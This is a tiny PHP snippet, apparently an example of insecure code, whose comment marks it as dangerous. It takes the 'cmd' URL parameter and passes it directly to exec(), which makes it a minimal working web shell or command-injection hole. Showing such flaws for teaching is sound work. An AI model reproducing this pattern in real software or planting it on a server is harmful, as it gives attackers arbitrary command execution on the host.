<?php
// Dangerous: executes user-controlled input
$cmd = $_GET['cmd'];
exec($cmd);

